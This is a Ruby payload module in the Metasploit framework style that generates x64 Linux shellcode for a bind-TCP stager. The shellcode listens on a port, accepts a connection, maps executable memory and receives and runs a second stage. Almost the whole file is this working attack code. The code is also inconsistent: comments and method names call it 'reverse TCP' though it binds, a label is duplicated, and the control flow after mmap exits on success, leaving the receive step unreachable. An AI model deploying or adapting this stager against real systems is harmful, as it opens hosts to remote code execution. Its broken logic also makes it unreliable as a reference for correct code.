# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/linux'

module Msf


###
#
# Complex reverse TCP payload generation for Linux ARCH_X64
#
###

module Payload::Linux::BindTcp_x64

  include Msf::Payload::TransportConfig
  include Msf::Payload::Linux

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port:        datastore['LPORT'],
      host:        datastore['LHOST'],
    }

    # Generate the advanced stager if we have space
    if self.available_space && required_space <= self.available_space
      conf[:exitfunk] = datastore['EXITFUNC']
    end

    generate_reverse_tcp(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def transport_config(opts={})
    transport_config_reverse_tcp(opts)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_tcp(opts={})
    asm = asm_bind_tcp(opts)
    buf = Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
    apply_prepends(buf)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = 300

    # Reliability adds 10 bytes for recv error checks
    space += 10

    # The final estimated size
    space
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Integer] :port The port to connect to
  # @option opts [String] :host The host IP to connect to
  # @option opts [Bool] :reliable Whether or not to enable error handling code
  #
  def asm_bind_tcp(opts={})
    # TODO: reliability is coming
    reliable     = opts[:reliable]
    encoded_port = [datastore['LPORT'].to_i,2].pack("vn").unpack("N").first
    encoded_host = Rex::Socket.addr_aton("0.0.0.0").unpack("V").first
    encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]

    asm = %Q^
      ;socket
        push  0x29
        pop   rax
        cdq
        push  0x2
        pop   rdi
        push  0x1
        pop   rsi
        syscall ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
        test  rax, rax
        jz failed
        
        xchg   rdi, rax

      ;bind
        push  rdx
        mov   rax, {#encoded_host_port}
        push  rax
        push  rax
        mov   rsi, rsp
        push  0x10
        pop   rdx
        push  0x31
        pop   rax
        syscall  ;bind(socket, sockaddr*, addrlen)

      ;listen
        push  0x32
        pop   rax
        push  0x1
        pop   rsi
        syscall
        xchg  rsi, rax

      ;accept
        ;rdi = socket
        ;rsi = sockaddr*
        push  0x2b
        pop   rax
        syscall
        pop   rcx  ;clear off sockaddr struct from stack
        pop   rcx  ;clear off sockaddr struct from stack
        
      ;mmap
        push  rax
        push  rsi
        pop   rdi
        push  0x9
        pop   rax
        cdq
        mov   dh, 0x10
        mov   rsi, rdx
        xor   r9, r9
        push  0x22
        pop   r10
        xor rdx, rdx
        mov   dl, 0x7
        syscall
        test  rax, rax
        jnz failed

      failed:
        failed:
        push  0x3c
        pop   rax
        push  0x1
        pop   rdi
        syscall ; exit(1)

      ;recv
        xchg  rsi, rax
        xchg  rdi, rax
        pop   rdi
        syscall
        jmp   rsi

    ^

    asm
  end

end

end
